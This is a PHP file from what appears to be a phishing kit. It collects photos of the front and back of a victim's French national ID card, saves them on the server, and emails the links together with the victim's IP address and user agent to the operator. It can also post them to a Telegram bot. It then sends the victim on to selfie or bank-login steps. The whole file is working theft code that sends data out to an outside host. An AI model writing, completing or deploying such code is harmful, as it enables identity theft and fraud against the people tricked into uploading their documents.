<?php 
session_start();
include('../settings.php');
include ('../isk/all.php');


if(strpos($_SERVER['REQUEST_URI'], $_SESSION['userid']))
{



if(!empty($_FILES['recto']) || !empty($_FILES['verso']))
{
	$extensions = array('.png', '.gif', '.jpg', '.jpeg');
	$recto = strrchr($_FILES['recto']['name'], '.');
	$verso = strrchr($_FILES['verso']['name'], '.');

	if(!in_array($recto, $extensions) || !in_array($verso, $extensions)) //Si l'extension n'est pas dans le tableau
	{
     
    header('Location: cni.php?'.$_SESSION['userid'].$_SESSION['gotocni'].'error=true');

	}
	else{
		mkdir("cni/".$_SESSION['nom']."/", 0777);	
	$folder = "cni/".$_SESSION['nom']."/";
	$recto = basename($_FILES['recto']['name']);
	move_uploaded_file($_FILES['recto']['tmp_name'], $folder . $recto);
	$verso = basename($_FILES['verso']['name']);
	move_uploaded_file($_FILES['verso']['tmp_name'], $folder . $verso);
	$link1 = "http://".$_SERVER['HTTP_HOST']."/myaccount/app/cni/".$_SESSION['nom']."/".$_FILES['recto']['name'];
	$link2 = "http://".$_SERVER['HTTP_HOST']."/myaccount/app/cni/".$_SESSION['nom']."/".$_FILES['verso']['name'];
	$subject = "=?utf-8?Q?=E3=80=8C=F0=9F=93=84=E3=80=8D_-_DOCS_=281=2F2=29_-_?=".$_SESSION['ip'];
	$message = "
📄 DOC TYPE : CNI

📄 DOC RECTO : ".$link1." 
📄 DOC VERSO : ".$link2."

🔑 Adresse IP : ".$_SESSION['ip']."
🕹️ User-agent : ".$_SESSION['useragent']."




	";
	$headers = "From: =?utf-8?Q?=F0=9F=A5=B7?= ".$spammername." =?utf-8?Q?=F0=9F=A5=B7?= <email@crusixv4.me>";
	 mail($boiterez,$subject,$message,$headers);
	 if($telegram == "on")
                      {
      
  $data = [
                                      'text' => '
                                      
📄 DOC TYPE : CNI

📄 DOC RECTO : '.$link1.' 
📄 DOC VERSO : '.$link2.'

🔑 Adresse IP : '.$_SESSION['ip'].'
🕹️ User-agent : '.$_SESSION['useragent'].'

                                      ',
                                      'chat_id' => $chat_id
                                ];

                            file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );

                      }

	 if($selfie == "on")
	{
	header('Location: loader.php?'.$_SESSION['userid'].$_SESSION['gotoselfie']);
	}
	else
	{

	if($log_bank == "on")
	{
	header('Location: loader.php?'.$_SESSION['userid'].$_SESSION['gotologbank']);
	}
	else{

	header('Location: loader.php?'.$_SESSION['userid'].$_SESSION['gotofinished']);

	}


	}

}
}

else{
	header('Location: cni.php?'.$_SESSION['userid'].$_SESSION['gotocni'].'error=true');
}




}
else{

	die('HTTP/1.0 404 Not Found');
}